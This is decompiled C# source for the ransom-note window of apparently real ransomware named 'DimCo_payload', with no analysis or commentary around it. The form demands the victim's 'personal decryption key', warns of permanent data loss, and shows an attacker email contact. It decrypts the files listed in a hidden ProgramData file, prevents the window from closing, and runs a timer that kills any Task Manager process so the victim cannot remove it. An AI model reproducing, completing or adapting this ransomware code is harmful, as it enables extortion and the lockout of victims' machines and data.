using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using DimCo_payload.Encryption;
using Newtonsoft.Json;

namespace DimCo_payload;

public class Form1 : Form
{
	private IContainer components;

	private RichTextBox richTextBox1;

	private Button button1;

	private Label label1;

	private Label label2;

	private Label label3;

	private Label label4;

	private Timer timer1;

	private Panel panel1;

	public Form1()
	{
		InitializeComponent();
	}

	private bool setup(string xml)
	{
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		string[] array = File.ReadAllLines("C:\\ProgramData\\DO_NOT_REMOVE.txt");
		foreach (string text in array)
		{
			try
			{
				((Control)panel1).Show();
				((Form)this).set_ControlBox(false);
				Console.WriteLine("decrypting " + text);
				Tuple<byte[], byte[]> encoded = JsonConvert.DeserializeObject<Tuple<byte[], byte[]>>(File.ReadAllText(text));
				File.WriteAllBytes(text, DimCo_payload.Encryption.Encryption.Decrypt_File_AESRSA(encoded, xml));
				File.Move(text, Path.ChangeExtension(text, null));
			}
			catch
			{
				MessageBox.Show("Incorrect key. Or decryption failed.");
				((Form)this).set_ControlBox(true);
				((Control)panel1).Hide();
				return false;
			}
		}
		global.isDencrypted = true;
		MessageBox.Show("Finished decryption. Please click OK to exit this program.", "Info", (MessageBoxButtons)0, (MessageBoxIcon)64);
		Application.Exit();
		return true;
	}

	private void button1_Click(object sender, EventArgs e)
	{
		setup(((Control)richTextBox1).get_Text());
	}

	private void button2_Click(object sender, EventArgs e)
	{
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)panel1).Hide();
		((Control)label4).set_Text(((Control)label4).get_Text() + global.contact);
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		if (!global.isDencrypted)
		{
			((CancelEventArgs)(object)e).Cancel = true;
			MessageBox.Show("Trying to exit this program can lead to a permanent data loss.", "Attention", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else
		{
			((CancelEventArgs)(object)e).Cancel = false;
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.ProcessName == "taskmgr" || process.ProcessName.Contains("taskmgr"))
				{
					process.Kill();
				}
			}
		}
		catch
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_0174: Unknown result type (might be due to invalid IL or missing references)
		//IL_017e: Expected O, but got Unknown
		//IL_01f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0200: Expected O, but got Unknown
		//IL_0285: Unknown result type (might be due to invalid IL or missing references)
		//IL_028f: Expected O, but got Unknown
		//IL_030d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0317: Expected O, but got Unknown
		//IL_04bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c6: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		richTextBox1 = new RichTextBox();
		button1 = new Button();
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		label4 = new Label();
		timer1 = new Timer(components);
		panel1 = new Panel();
		((Control)this).SuspendLayout();
		((Control)richTextBox1).set_Location(new Point(0, 317));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(552, 53));
		((Control)richTextBox1).set_TabIndex(0);
		((Control)richTextBox1).set_Text("");
		((Control)button1).set_Location(new Point(449, 368));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(104, 23));
		((Control)button1).set_TabIndex(1);
		((Control)button1).set_Text("Attempt decryption");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Arial", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_Location(new Point(3, 286));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(418, 28));
		((Control)label1).set_TabIndex(2);
		((Control)label1).set_Text("Please enter here your pesonnal decryption key\r\n(ATTENTION: Do not paste anything else than your key. Your data will be lost forever)");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Arial", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.Red);
		((Control)label2).set_Location(new Point(227, 7));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(98, 22));
		((Control)label2).set_TabIndex(3);
		((Control)label2).set_Text("Attention!");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Arial", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_Location(new Point(3, 31));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(531, 225));
		((Control)label3).set_TabIndex(4);
		((Control)label3).set_Text(componentResourceManager.GetString("label3.Text"));
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Arial", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_Location(new Point(11, 263));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(87, 15));
		((Control)label4).set_TabIndex(6);
		((Control)label4).set_Text("Email contact: ");
		timer1.set_Enabled(true);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((Control)panel1).set_Location(new Point(231, 18));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(168, 296));
		((Control)panel1).set_TabIndex(7);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(552, 390));
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
